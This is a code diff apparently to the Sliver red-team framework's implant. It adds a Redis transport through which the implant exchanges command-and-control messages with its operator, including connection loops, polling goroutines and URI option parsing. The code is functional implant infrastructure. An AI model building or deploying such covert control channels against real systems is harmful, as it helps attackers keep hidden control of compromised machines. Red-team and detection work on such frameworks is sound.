@@ -55,6 +55,10 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
 	// {{end}}
 
+	// {{if .Config.IncludeRedis}}
+	"github.com/bishopfox/sliver/implant/sliver/transports/redisclient"
+	// {{end}}
+
 	// {{if .Config.IncludeTCP}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
 	"google.golang.org/protobuf/proto"
@@ -152,6 +156,18 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 					continue
 				}
 				// {{end}} - IncludeDNS
+
+			case "redis":
+				// *** Redis ***
+				// {{if .Config.IncludeRedis}}
+				connection, err = redisConnect(uri)
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[redis] Connection failed %s", err)
+					// {{end}}
+					continue
+				}
+				// {{end}} - IncludeRedis
 
 			case "namedpipe":
 				// *** Named Pipe ***
@@ -632,6 +648,160 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 }
 
 // {{end}} - .IncludeDNS
+
+// {{if .Config.IncludeRedis}}
+func redisConnect(uri *url.URL) (*Connection, error) {
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan struct{}, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		uri:     uri,
+		IsOpen:  false,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[redis] lost connection, cleanup...")
+			// {{end}}
+			ctrl <- struct{}{}
+			close(recv)
+		},
+	}
+
+	connection.Stop = func() error {
+		// {{if .Config.Debug}}
+		log.Printf("[redis] Stop()")
+		// {{end}}
+		connection.Cleanup()
+		return nil
+	}
+
+	connection.Start = func() error {
+		// {{if .Config.Debug}}
+		log.Printf("Connecting -> redis://%s", uri.Host)
+		// {{end}}
+		opts := parseRedisOptions(uri)
+		client, err := redisclient.RedisStartSession(uri.Host, opts)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("redis connection error %v", err)
+			// {{end}}
+			return err
+		}
+		connection.IsOpen = true
+
+		// Sending goroutine - reads from send channel and writes to Redis
+		go func() {
+			defer connection.Cleanup()
+			for envelope := range send {
+				// {{if .Config.Debug}}
+				log.Printf("[redis] send envelope ...")
+				// {{end}}
+				if err := client.WriteEnvelope(envelope); err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[redis] write error: %v", err)
+					// {{end}}
+					return
+				}
+			}
+		}()
+
+		// Receiving goroutine - polls Redis and writes to recv channel
+		go func() {
+			defer connection.Cleanup()
+			errCount := 0 // Number of sequential errors
+			for {
+				select {
+				case <-ctrl:
+					client.CloseSession()
+					return
+				default:
+					envelope, err := client.ReadEnvelope()
+					if err == redisclient.ErrClosed {
+						// {{if .Config.Debug}}
+						log.Printf("[redis] session closed")
+						// {{end}}
+						return
+					}
+					if err != nil {
+						errCount++
+						// {{if .Config.Debug}}
+						log.Printf("[redis] read error #%d: %v", errCount, err)
+						// {{end}}
+						if errCount < opts.MaxErrors {
+							time.Sleep(time.Second) // Brief backoff
+							continue
+						}
+						return // Max errors exceeded
+					}
+					errCount = 0
+					if envelope != nil {
+						recv <- envelope
+					}
+				}
+			}
+		}()
+
+		return nil
+	}
+
+	return connection, nil
+}
+
+// parseRedisOptions - Parse Redis-specific options from URI query parameters
+func parseRedisOptions(uri *url.URL) *redisclient.RedisOptions {
+	pollTimeout, err := time.ParseDuration(uri.Query().Get("poll-timeout"))
+	if err != nil || pollTimeout == 0 {
+		pollTimeout = 30 * time.Second
+	}
+
+	dialTimeout, err := time.ParseDuration(uri.Query().Get("dial-timeout"))
+	if err != nil || dialTimeout == 0 {
+		dialTimeout = 10 * time.Second
+	}
+
+	readTimeout, err := time.ParseDuration(uri.Query().Get("read-timeout"))
+	if err != nil || readTimeout == 0 {
+		readTimeout = 30 * time.Second
+	}
+
+	writeTimeout, err := time.ParseDuration(uri.Query().Get("write-timeout"))
+	if err != nil || writeTimeout == 0 {
+		writeTimeout = 10 * time.Second
+	}
+
+	maxErrors := 10
+	if maxErrStr := uri.Query().Get("max-errors"); maxErrStr != "" {
+		if me, err := strconv.Atoi(maxErrStr); err == nil && me > 0 {
+			maxErrors = me
+		}
+	}
+
+	db := 0
+	if dbStr := uri.Query().Get("db"); dbStr != "" {
+		if dbNum, err := strconv.Atoi(dbStr); err == nil && dbNum >= 0 {
+			db = dbNum
+		}
+	}
+
+	return &redisclient.RedisOptions{
+		Addr:         uri.Host,
+		Password:     uri.Query().Get("password"),
+		DB:           db,
+		PollTimeout:  pollTimeout,
+		MaxErrors:    maxErrors,
+		DialTimeout:  dialTimeout,
+		ReadTimeout:  readTimeout,
+		WriteTimeout: writeTimeout,
+		TLSEnabled:   uri.Query().Get("tls") == "true",
+	}
+}
+
+// {{end}} - .IncludeRedis
 
 // {{if .Config.IncludeTCP}}
 func tcpPivotConnect(uri *url.URL) (*Connection, error) {
